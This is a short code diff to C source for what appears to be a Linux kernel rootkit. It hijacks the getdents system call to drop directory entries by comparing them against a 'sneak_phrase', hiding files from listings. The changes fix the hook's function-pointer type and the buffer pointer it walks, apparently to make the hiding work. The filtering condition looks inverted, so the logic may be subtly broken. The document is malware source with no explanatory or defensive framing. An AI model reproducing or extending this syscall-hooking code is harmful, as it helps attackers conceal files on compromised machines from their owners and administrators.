@@ -24,7 +24,7 @@ struct linux_dirent{
 
 };
 
-typedef asmlinkage int (*originalGetDentsA) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+typedef asmlinkage long (*originalGetDentsA) (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 originalGetDentsA originalGetDents=NULL;
 
 static asmlinkage long* hijackgetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
@@ -40,7 +40,7 @@ static asmlinkage long* hijackgetdents(unsigned int fd, struct linux_dirent *dir
 
     int counter=0;
     while(counter<original){
-        hijackedDirent=(struct linux_dirent*)(fileNames+counter);
+        hijackedDirent=(struct linux_dirent*)(hijackedBuffer+counter);
         if((strncmp(hijackedDirent->d_name,sneak_phrase, (sizeof(sneak_phrase)-1)))){
         memcpy(hijackedBuffer+counter, hijackedBuffer+counter+hijackedDirent->d_reclen, original-(counter+hijackedDirent->d_reclen));
     }
